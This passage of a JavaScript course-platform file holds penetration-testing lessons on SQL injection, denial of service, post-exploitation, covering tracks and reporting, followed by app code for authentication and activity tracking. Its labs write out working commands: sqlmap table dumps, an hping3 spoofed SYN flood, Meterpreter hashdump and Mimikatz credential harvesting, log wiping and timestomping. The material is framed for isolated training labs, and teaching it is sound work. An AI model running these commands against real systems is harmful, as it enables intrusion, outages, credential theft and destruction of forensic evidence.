                    "<p>Manually finding and exploiting SQL injection vulnerabilities can be complex and time-consuming. <strong>SQLmap</strong> is an open-source penetration testing tool that automates this entire process. An attacker can point SQLmap at a potentially vulnerable web page, and it will:</p><ol><li>Automatically test dozens of different SQL injection techniques against every parameter.</li><li>Identify the type of database backend (e.g., MySQL, Oracle, MSSQL).</li><li>If a vulnerability is found, provide a simple interface to exploit it.</li></ol><p>With a successful SQLmap exploit, an attacker can list all databases, tables, and columns, and then issue a command to dump all the data from a specific table, like the `users` table containing usernames and password hashes.</p>",
                  image:
                    "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Dump a MySQL Database with SQLmap",
                  language: "bash",
                  code: '# This lab targets a vulnerable web application, like DVWA (Damn Vulnerable Web Application) or the web apps on OWASP BWA.\n\n# Step 1: Find a vulnerable entry point.\n# - Navigate to the \'SQL Injection\' page of your target web app.\n# - The URL will look something like: http://TARGET_IP/vulnerabilities/sqli/?id=1&Submit=Submit#\n\n# Step 2: Launch SQLmap and point it at the target URL.\n# sqlmap -u "URL" [options]\n# -u : The target URL. It must be in quotes.\n# --dbs : An action telling SQLmap to try and enumerate all the databases.\n\nsqlmap -u "http://TARGET_IP/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=..." --dbs\n# NOTE: You may need to provide your session cookie so SQLmap can access the page as a logged-in user. You can get this from your browser\'s developer tools.\n\n# Step 3: Enumerate Tables and Columns.\n# - SQLmap will identify the injection and then list the available databases.\n# - Now, let\'s look inside one of those databases, e.g., \'dvwa\'.\n# -D dvwa : Specify the database.\n# --tables : Tell SQLmap to list all tables in this database.\n\nsqlmap -u "..." --cookie="..." -D dvwa --tables\n\n# Step 4: Dump the Data.\n# - SQLmap will list the tables, including one named \'users\'.\n# - Finally, let\'s dump the contents of that table.\n# -T users : Specify the table.\n# --dump : Tell SQLmap to retrieve all the data.\n\nsqlmap -u "..." --cookie="..." -D dvwa -T users --dump\n\n# SQLmap will now extract and display the usernames and password hashes from the users table. It will even offer to try and crack them for you using a dictionary attack.',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is a common first step when attacking a database service that is directly exposed to the network?",
                  options: [
                    "Trying to delete the database.",
                    "Attempting to log in with default or weak credentials.",
                    "Performing a denial-of-service attack.",
                    "Changing the database's port number.",
                  ],
                  correct: 1,
                  explanation:
                    "Default and weak passwords are a very common misconfiguration, and checking for them is often the quickest way to gain access to an exposed database.",
                },
                {
                  id: 2,
                  question:
                    "An SQL injection vulnerability is typically found in what component of an application?",
                  options: [
                    "The web server software (e.g., Apache).",
                    "The client-side JavaScript.",
                    "The server-side code that constructs SQL queries using unsanitized user input.",
                    "The network firewall.",
                  ],
                  correct: 2,
                  explanation:
                    "SQLi is a code-level vulnerability. It happens when a developer fails to properly validate and sanitize input from a user before embedding it into a database query.",
                },
                {
                  id: 3,
                  question: "What is the primary purpose of the tool SQLmap?",
                  options: [
                    "It is a database backup tool.",
                    "It is a web browser.",
                    "It automates the process of detecting and exploiting SQL injection vulnerabilities.",
                    "It is a network port scanner.",
                  ],
                  correct: 2,
                  explanation:
                    "SQLmap is the go-to tool for pentesters to efficiently find and exploit SQLi flaws, from detection to full data exfiltration.",
                },
              ],
            },
          },
          {
            id: "lesson-17",
            title: "Denial-of-Service Attacks",
            duration: "60 min",
            objectives: [
              "Define a Denial-of-Service (DoS) attack and its goal",
              "Differentiate between DoS and Distributed DoS (DDoS)",
              "Understand the mechanics of a SYN flood attack",
              "Simulate a DoS attack in a controlled lab environment",
            ],
            content: {
              overview:
                "A Denial-of-Service (DoS) attack is an attempt to make a machine or network resource unavailable to its intended users. Unlike the other attacks we've studied, the goal isn't to steal data, but simply to disrupt service. This lesson covers the concepts behind common DoS attacks and how to simulate them safely in an isolated lab environment for testing purposes.",
              sections: [
                {
                  title: "The Goal: Disruption, Not Theft",
                  content:
                    "<p>The objective of a DoS attack is to overwhelm a target with so much traffic or so many requests that it cannot respond to legitimate users. The target could be a website, a server, or an entire network. For a penetration tester, launching a DoS attack is almost always <strong>out of scope</strong> for a real engagement unless explicitly permitted for a specific availability test, as it can cause real damage to the client's business operations.</p><h3>DoS vs. DDoS</h3><ul><li><strong>DoS (Denial-of-Service):</strong> An attack launched from a single system. Its effectiveness is limited by the bandwidth of the attacker.</li><li><strong>DDoS (Distributed Denial-of-Service):</strong> An attack launched from many different, geographically dispersed computers simultaneously. These compromised machines, called a 'botnet', can generate enormous volumes of traffic that are much harder to defend against.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop",
                },
                {
                  title: "Types of DoS Attacks",
                  content:
                    "<h3>SYN Flood</h3><p>This is a classic network-layer DoS attack that exploits the TCP three-way handshake. The attacker sends a high volume of TCP SYN packets to the target server, but uses spoofed (fake) source IP addresses. The server responds with a SYN/ACK to each fake IP and waits for the final ACK to complete the handshake. Because the ACK never arrives, the server keeps the connection in a 'half-open' state, consuming memory and resources. When enough connections are left half-open, the server can no longer accept new, legitimate connections.</p><h3>Slowloris</h3><p>This is an application-layer DoS attack that targets web servers. Instead of flooding with traffic, the attacker opens many connections to a web server. For each connection, it sends an incomplete HTTP request, but sends it very, very slowly, one header at a time, every few minutes. The server keeps all these connections open, waiting for the requests to complete. This eventually exhausts the server's maximum concurrent connection pool, making it unable to respond to legitimate users.</p>",
                  image:
                    "https://images.unsplash.com/photo-1594402633342-a08b3c31fad1?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Launch a SYN Flood in a Test Lab with hping3",
                  language: "bash",
                  code: "# WARNING: ONLY perform this in an isolated lab network. This will make the target VM unresponsive.\n\n# `hping3` is a powerful packet crafting tool that can be used for DoS testing.\n\n# Step 1: Identify your target.\n# Choose one of your lab VMs as the target (e.g., Metasploitable 2).\n\n# Step 2: Formulate the hping3 command.\n# -S : Send SYN packets.\n# -p 80 : Target port 80 (the web server).\n# --flood : Send packets as fast as possible, don't wait for replies.\n# --rand-source : Use random (spoofed) source IP addresses. This is the key to the attack.\n\n`sudo hping3 -S -p 80 --flood --rand-source TARGET_IP`\n\n# Step 3: Launch the attack.\n# Press Enter. `hping3` will begin sending a massive flood of SYN packets to the target.\n\n# Step 4: Observe the effect.\n# While the attack is running, try to access the web page on the target VM from a different machine in your lab.\n# The connection will time out or fail. The server's resources are completely consumed by handling the fake handshake requests, and it cannot service legitimate traffic.\n\n# Step 5: Stop the attack.\n# Press `Ctrl + C` in the hping3 terminal to stop the flood. The target VM should become responsive again after a short time.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary goal of a Denial-of-Service (DoS) attack?",
                  options: [
                    "To steal data.",
                    "To gain administrative access.",
                    "To make a service or resource unavailable to legitimate users.",
                    "To install malware.",
                  ],
                  correct: 2,
                  explanation:
                    "DoS attacks are focused on disrupting availability, not on confidentiality or integrity.",
                },
                {
                  id: 2,
                  question:
                    "What is the main difference between a DoS and a DDoS attack?",
                  options: [
                    "DoS is for web servers, DDoS is for networks.",
                    "DoS is an attack from a single source, while DDoS is a coordinated attack from many distributed sources (a botnet).",
                    "DDoS attacks are less powerful than DoS attacks.",
                    "DoS attacks are legal, but DDoS attacks are not.",
                  ],
                  correct: 1,
                  explanation:
                    "The 'Distributed' nature of a DDoS attack is what makes it so powerful and difficult to defend against, as blocking a single source IP is ineffective.",
                },
                {
                  id: 3,
                  question: "How does a SYN flood attack work?",
                  options: [
                    "It sends very large packets to consume bandwidth.",
                    "It exploits the TCP three-way handshake by sending many SYN packets with spoofed source IPs, forcing the server to keep connections half-open until its resources are exhausted.",
                    "It sends incomplete HTTP requests to tie up a web server.",
                    "It repeatedly guesses a user's password to lock their account.",
                  ],
                  correct: 1,
                  explanation:
                    "A SYN flood is a resource exhaustion attack that targets the state table of a server or firewall by abusing the connection setup process.",
                },
              ],
            },
          },
          {
            id: "lesson-18",
            title: "Post-Exploitation",
            duration: "90 min",
            objectives: [
              "Define the goals of post-exploitation",
              "Understand techniques for maintaining persistence",
              "Use Metasploit to dump the SAM database for offline cracking",
              "Gather situational awareness on a compromised host",
            ],
            content: {
              overview:
                "You're in. What's next? Post-exploitation is the phase of a penetration test that begins after you have gained initial access to a machine. The goals are to explore the compromised system, gather valuable information, escalate privileges if you haven't already, and establish a persistent foothold to ensure you don't lose your access.",
              sections: [
                {
                  title: "Goals of Post-Exploitation",
                  content:
                    "<p>Once you have a shell, the real work begins. Your immediate goals are:</p><ol><li><strong>Situational Awareness:</strong> Figure out where you are. What kind of machine is this? What user are you? What is its role in the network? What other users are logged in? What are the network connections?</li><li><strong>Privilege Escalation:</strong> If your shell is low-privileged, your top priority is to find a path to root or SYSTEM access.</li><li><strong>Credential Harvesting:</strong> Find and extract any credentials you can: plaintext passwords in config files, browser passwords, SSH keys, and password hashes from memory or the OS.</li><li><strong>Persistence:</strong> Ensure you can get back into the machine later, even if it reboots or your initial exploit is patched.</li><li><strong>Lateral Movement:</strong> Use the information and credentials you've gathered to pivot and attack other machines on the network.</li></ol>",
                  image:
                    "https://images.unsplash.com/photo-1516110833953-7a916730302b?w=800&h=400&fit=crop",
                },
                {
                  title: "Persistence Techniques",
                  content:
                    "<p>A simple reverse shell is fragile; if the connection drops, your access is gone. Persistence is about creating a backdoor that allows you to reconnect at will.</p><ul><li><strong>Windows:</strong> Common techniques include creating a new service that launches your payload, adding a startup key to the registry (`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`), or using a Scheduled Task.</li><li><strong>Linux:</strong> The most common method is to create a cron job, a scheduled task that can be set to run your payload every minute, every hour, or at system boot. Other methods include adding a command to a user's `.bashrc` file or creating a new systemd service.</li></ul><p>Metasploit's Meterpreter includes post-exploitation modules to automate the creation of persistence mechanisms.</p>",
                  image:
                    "https://images.unsplash.com/photo-1599507578794-279213135e13?w=800&h=400&fit-crop",
                },
                {
                  title: "Dumping Hashes from Memory with Mimikatz",
                  content:
                    "<p>On Windows systems, one of the most powerful post-exploitation tools is <strong>Mimikatz</strong>. Its primary function is to extract credentials from memory, specifically from the Local Security Authority Subsystem Service (LSASS) process. Even if passwords are not stored in cleartext, Mimikatz can often dump the NTLM hashes of all currently logged-on users. These hashes can then be used in Pass-the-Hash attacks or taken offline for cracking. Metasploit's Meterpreter can load a version of Mimikatz directly into memory on the target, so you never have to write the tool to disk, making it very stealthy.</p>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Dump SAM Hashes with Metasploit's Meterpreter",
                  language: "bash",
                  code: "# This lab assumes you have a SYSTEM-level Meterpreter session on a Windows target from a previous lab.\n\n# Step 1: Gain a SYSTEM Meterpreter session.\n# For example, using the EternalBlue exploit.\n\n# Step 2: Use the `hashdump` post-exploitation module.\n# This is one of the most common first steps after getting SYSTEM.\n# The `hashdump` command will interact with the SAM database and dump the stored NTLM hashes for all local users on the machine.\n# From your Meterpreter prompt:\n`meterpreter > hashdump`\n\n# The output will be in the format: [Username]:[User ID]:[LM Hash]:[NTLM Hash]:::\n# You can copy the NTLM hash portion for cracking.\n\n# Step 3: Use the `smart_migrate` script (Optional).\n# Antivirus software often monitors common processes like `explorer.exe`.\n# Migrating your Meterpreter process into a less-obvious process can help with stealth.\n# First, list the running processes.\n`meterpreter > ps`\n# Find a stable process running as SYSTEM (e.g., `services.exe`).\n# `meterpreter > migrate [PID of services.exe]`\n\n# Step 4: Load Mimikatz to get plaintext passwords from memory.\n# First, load the Kiwi module (Metasploit's version of Mimikatz).\n`meterpreter > load kiwi`\n\n# Now, run the command to dump all credentials it can find from memory.\n`meterpreter > creds_all`\n\n# This will dump a lot of information, but if a user has logged in recently, it may show their password in cleartext, in addition to their NTLM hash. This is far more valuable than just the hash.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Which of the following is a primary goal of the post-exploitation phase?",
                  options: [
                    "Scanning for open ports.",
                    "Performing a dictionary attack.",
                    "Establishing persistence and harvesting credentials.",
                    "Writing the final report.",
                  ],
                  correct: 2,
                  explanation:
                    "Post-exploitation is what you do after you're 'in'. Key goals include maintaining access (persistence) and gathering more information (credentials) to expand your foothold.",
                },
                {
                  id: 2,
                  question:
                    "What is 'persistence' in the context of a penetration test?",
                  options: [
                    "A method for gaining initial access.",
                    "The process of exfiltrating data.",
                    "A technique for ensuring that you can regain access to a compromised system, even after a reboot.",
                    "The act of deleting logs.",
                  ],
                  correct: 2,
                  explanation:
                    "Persistence is about creating a backdoor, like a cron job or a registry run key, that allows an attacker to re-establish their connection on demand.",
                },
                {
                  id: 3,
                  question:
                    "The tool Mimikatz is famous for its ability to do what on a Windows system?",
                  options: [
                    "Scan for open SMB shares.",
                    "Exploit the EternalBlue vulnerability.",
                    "Extract plaintext passwords and hashes from the LSASS process in memory.",
                    "Clear the Windows event logs.",
                  ],
                  correct: 2,
                  explanation:
                    "Mimikatz is the premier tool for credential harvesting on Windows, capable of pulling credentials directly from memory, which is a key part of post-exploitation.",
                },
              ],
            },
          },
          {
            id: "lesson-19",
            title: "Covering Tracks",
            duration: "60 min",
            objectives: [
              "Understand the purpose of covering tracks in a penetration test",
              "Identify the primary logs an attacker would modify or delete",
              "Use tools to clear shell history and system logs",
              "Understand the concept of timestomping",
            ],
            content: {
              overview:
                "The final stage of the active attack process is to remove evidence of your presence. A skilled attacker aims to be a ghost, leaving as few traces as possible for digital forensics teams to find. This lesson covers the basic techniques for covering your tracks, such as clearing logs, hiding files, and altering timestamps. In a professional penetration test, this phase is often limited or simulated to demonstrate the possibility to the client.",
              sections: [
                {
                  title: "The Importance of Stealth",
                  content:
                    "<p>For a real-world attacker, avoiding detection is paramount. For a penetration tester, the goal is often to demonstrate to the client that their monitoring and logging capabilities are insufficient to detect a sophisticated attack. Covering tracks involves removing or altering the digital breadcrumbs left behind during the intrusion.</p><h3>Key Artifacts to Target:</h3><ul><li><strong>Command History:</strong> Your shell on the compromised machine keeps a log of all the commands you typed (e.g., `.bash_history`).</li><li><strong>System Logs:</strong> The operating system and applications record events, such as logins (successful and failed), service startups, and errors (e.g., `/var/log/auth.log` on Linux, the Event Viewer on Windows).</li><li><strong>File Timestamps:</strong> When you create or modify a file (like uploading a tool), it gets a new timestamp that shows when you were active.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=800&h=400&fit=crop",
                },
                {
                  title: "Techniques for Covering Tracks",
                  content:
                    "<ul><li><strong>Clearing Command History:</strong> The simplest step is to delete the history file (`rm ~/.bash_history`) or selectively remove incriminating commands. A better method is to disable history logging entirely for your session at the start.</li><li><strong>Clearing Logs:</strong> This is a more aggressive action. On Linux, an attacker might delete the contents of key log files. On Windows, an attacker with SYSTEM privileges can use built-in commands or Metasploit modules to specifically clear the Security, System, and Application event logs. However, the act of clearing the logs is itself a highly suspicious event that is often detected by central logging servers (SIEMs).</li><li><strong>Timestomping:</strong> This is the process of altering the timestamps (Modify, Access, Create) of a file to make it look like it was not recently touched. An attacker can change a file's timestamp to match another, older file on the system, hoping it will blend in and not be noticed by an investigator. Meterpreter has a `timestomp` command for this purpose.</li><li><strong>Using Rootkits:</strong> A rootkit is a sophisticated type of malware designed to hide the presence of an attacker. It can hook into the operating system kernel to lie about running processes, network connections, and the existence of files, making the attacker's tools invisible to the system administrator.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1542382257-80ded13c79c8?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Clear Logs and History",
                  language: "bash",
                  code: "# This lab assumes you have a root or SYSTEM shell on your target machine.\n# Performing these actions is often a specific objective to test a client's detection capabilities.\n\n# --- Linux Post-Exploitation ---\n\n# Step 1: Disabling Shell History (Proactive)\n# `unset HISTFILE`\n# OR set the history file size to zero for the current session:\n# `export HISTFILESIZE=0`\n\n# Step 2: Clearing Shell History (Reactive)\n# `cat /dev/null > ~/.bash_history && history -c`\n\n# Step 3: Clearing System Logs\n# This is a very loud and easily detectable action, but demonstrates the capability.\n# `cat /dev/null > /var/log/auth.log`\n# `cat /dev/null > /var/log/wtmp`\n\n# --- Windows Post-Exploitation (Using Meterpreter) ---\n# This lab assumes you have a SYSTEM Meterpreter session.\n\n# Step 1: Clearing Windows Event Logs\n# Meterpreter has a simple command for this.\n`meterpreter > clearev`\n\n# This will wipe the Application, System, and Security event logs, making investigation much harder for a local administrator.\n\n# Step 2: Timestomping a File\n# First, upload a file to the target.\n`meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\System32\\`\n\n# Now, use `timestomp` to change the timestamps of our uploaded file to match a legitimate system file.\n`meterpreter > timestomp C:\\Windows\\System32\\mimikatz.exe -f C:\\Windows\\System32\\kernel32.dll`\n\n# Now, if an admin looks at the directory sorted by date, `mimikatz.exe` will not stand out as a newly created file.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In the context of a penetration test, what is the main purpose of 'covering tracks'?",
                  options: [
                    "To perform a denial-of-service attack.",
                    "To demonstrate that an attacker could remove evidence of their presence, thereby testing the client's monitoring and forensic capabilities.",
                    "To gain root access to a system.",
                    "To install a persistent backdoor.",
                  ],
                  correct: 1,
                  explanation:
                    "This phase is about demonstrating the impact of an intrusion on the client's ability to detect and respond to an attack after the fact.",
                },
                {
                  id: 2,
                  question:
                    "Why is clearing the entire system security log a 'loud' and often easily detected action?",
                  options: [
                    "Because it is impossible to do.",
                    "Because it consumes a lot of bandwidth.",
                    "Because centralized logging systems (SIEMs) will often notice the interruption in log flow or receive an explicit 'log cleared' event, which is a major red flag for an administrator.",
                    "Because it crashes the server.",
                  ],
                  correct: 2,
                  explanation:
                    "The absence of logs is often as telling as the logs themselves. A blank security log is a clear sign of tampering to any security team with centralized logging.",
                },
                {
                  id: 3,
                  question: "What is 'timestomping'?",
                  options: [
                    "A type of DoS attack.",
                    "A method to synchronize clocks between servers.",
                    "The process of modifying the timestamps of a file to hide its true creation or modification time.",
                    "A tool for brute-forcing passwords.",
                  ],
                  correct: 2,
                  explanation:
                    "Timestomping is an anti-forensics technique used to make malicious files blend in with legitimate, older system files to avoid detection.",
                },
              ],
            },
          },
          {
            id: "lesson-20",
            title: "Reporting & Mitigation",
            duration: "90 min",
            objectives: [
              "Understand that the report is the most important deliverable of a penetration test",
              "Identify the key sections of a professional penetration test report",
              "Differentiate between executive summary and technical details",
              "Learn how to provide actionable remediation guidance",
            ],
            content: {
              overview:
                "The keyboard-on-hands hacking is over, but the most important work has just begun. A penetration test provides no value if the findings are not communicated clearly and effectively. The final report is the ultimate deliverable of the engagement. This final lesson covers the critical skill of structuring and writing a professional report that delivers actionable insights to both executive and technical audiences, helping the client to genuinely improve their security posture.",
              sections: [
                {
                  title: "The Report: The Ultimate Deliverable",
                  content:
                    "<p>You can be the most skilled hacker in the world, but if you cannot clearly explain what you did, what you found, why it matters, and how to fix it, you have failed as a penetration tester. The report is the tangible product that the client pays for. A good report should be:</p><ul><li><strong>Accurate:</strong> All findings must be technically correct and validated. False positives destroy credibility.</li><li><strong>Clear and Concise:</strong> Written in plain language that is easy for the intended audience to understand.</li><li><strong>Actionable:</strong> It must provide specific, prioritized, and realistic recommendations for remediation.</li><li><strong>Professional:</strong> Well-formatted, free of errors, and respectful in its tone.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1557804506-669a67965ba0?w=800&h=400&fit=crop",
                },
                {
                  title: "Key Sections of a Penetration Test Report",
                  content:
                    "<p>A professional report is typically structured to serve two different audiences.</p><h3>1. The Executive Summary</h3><p>Written for management, CISOs, and other non-technical stakeholders. This section should be brief (1-2 pages) and focus on the business impact.</p><ul><li><strong>Introduction:</strong> Briefly restates the scope, objectives, and timeframe of the test.</li><li><strong>Overall Security Posture:</strong> A high-level assessment of the target's security (e.g., 'Good', 'Fair', 'Critical'). Often includes a letter grade.</li><li><strong>Summary of Critical Findings:</strong> Highlights the 2-3 most significant vulnerabilities in plain business terms (e.g., 'A flaw was discovered in the public web server that allowed our team to gain access to the internal customer database.').</li><li><strong>Positive Security Notes:</strong> It's good practice to mention what the client is doing well (e.g., 'The internal network was well-segmented, which made lateral movement difficult.').</li><li><strong>Strategic Recommendations:</strong> High-level recommendations, like 'Implement a patch management program' or 'Conduct developer security training'.</li></ul><h3>2. Technical Details Section</h3><p>Written for system administrators, developers, and the IT security team. This is the heart of the report and contains all the technical evidence.</p><ul><li><strong>Methodology:</strong> A description of the tools and methods used.</li><li><strong>Detailed Findings:</strong> Each vulnerability gets its own section, which includes:<ul><li><strong>Name and Severity:</strong> A clear title (e.g., 'MS17-010 EternalBlue Remote Code Execution') and a risk rating (e.g., Critical, High, Medium, Low).</li><li><strong>Description:</strong> An explanation of what the vulnerability is and why it's a risk.</li><li><strong>Affected Hosts:</strong> A list of all IPs or hosts where the vulnerability was found.</li><li><strong>Proof-of-Concept / Replication Steps:</strong> A detailed, step-by-step description of how to reproduce the exploit. This is critical for the client to validate the finding. Screenshots are essential here.</li><li><strong>Remediation:</strong> Clear, actionable steps on how to fix the vulnerability. This should include links to vendor advisories, patches, and configuration guides.</li></ul></li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Write a Sample Penetration Test Report",
                  language: "markdown",
                  code: "# Based on the labs you have completed, you now have findings for Metasploitable 2 and a Windows VM.\n# Your task is to structure them into a professional report using a text editor or word processor.\n\n# --- EXECUTIVE SUMMARY ---\n# Overall Posture: Critical\n# Summary: The assessment identified several critical vulnerabilities in the lab network that allowed testers to gain complete administrative control over both the primary Linux server and a Windows workstation. Key findings include a public exploit against the FTP service (vsftpd backdoor) and a 'wormable' vulnerability in the Windows file sharing service (MS17-010 EternalBlue), both of which led to a full system compromise. Weak and default passwords were also discovered across multiple services.\n# Strategic Recommendation: Implement a formal patch management policy and conduct a full audit of all system configurations to remove default credentials.\n\n# --- TECHNICAL FINDING 1 ---\n# - Vulnerability: vsftpd v2.3.4 Backdoored Command Execution\n# - Risk: Critical\n# - Affected Host: [IP of Metasploitable 2]\n# - Description: The version of vsftpd running on the host contains a backdoor that was added to the source code. A malicious user can connect to the FTP server and send a specific sequence to gain a root-level command shell on the underlying operating system.\n# - Replication Steps:\n#   1. In Metasploit, use the module `exploit/unix/ftp/vsftpd_234_backdoor`.\n#   2. Set RHOSTS to the target IP.\n#   3. Run the exploit.\n#   4. Connect to the opened shell on port 6200 with `nc [TARGET_IP] 6200`.\n#   5. The resulting shell has UID=0 (root) access.\n# - Remediation: The application is intentionally vulnerable. In a real environment, the immediate recommendation would be to update the vsftpd package to the latest stable version provided by the distribution's package manager (`sudo apt-get update && sudo apt-get install vsftpd`).\n\n# (Create a similar technical finding section for the MS17-010 exploit against the Windows VM, including screenshots and remediation guidance).",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Who is the primary audience for the 'Executive Summary' section of a pentest report?",
                  options: [
                    "The technical IT team",
                    "Developers and system administrators",
                    "Management, CISOs, and other non-technical stakeholders",
                    "External auditors",
                  ],
                  correct: 2,
                  explanation:
                    "The Executive Summary should focus on business risk and high-level impact, using clear, non-technical language that is appropriate for leadership.",
                },
                {
                  id: 2,
                  question:
                    "What is the most critical component of a detailed technical finding?",
                  options: [
                    "The time of day the vulnerability was found.",
                    "A link to the tool used.",
                    "The name of the pentester who found it.",
                    "A detailed, step-by-step proof-of-concept and clear remediation guidance.",
                  ],
                  correct: 3,
                  explanation:
                    "The client must be able to independently verify your findings. Providing clear replication steps is essential for credibility. Equally important is providing actionable advice on how to fix the problem.",
                },
                {
                  id: 3,
                  question:
                    "Why is it important to provide a risk rating (e.g., Critical, High, Medium) for each finding?",
                  options: [
                    "To make the report longer.",
                    "To help the client prioritize their remediation efforts, focusing on the most severe issues first.",
                    "It is a legal requirement.",
                    "To determine the final price of the pentest.",
                  ],
                  correct: 1,
                  explanation:
                    "A flat list of vulnerabilities is not helpful. Prioritizing findings based on risk allows the client's IT team to allocate their limited resources effectively, tackling the biggest threats first.",
                },
              ],
            },
          },
        ],
      }; // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
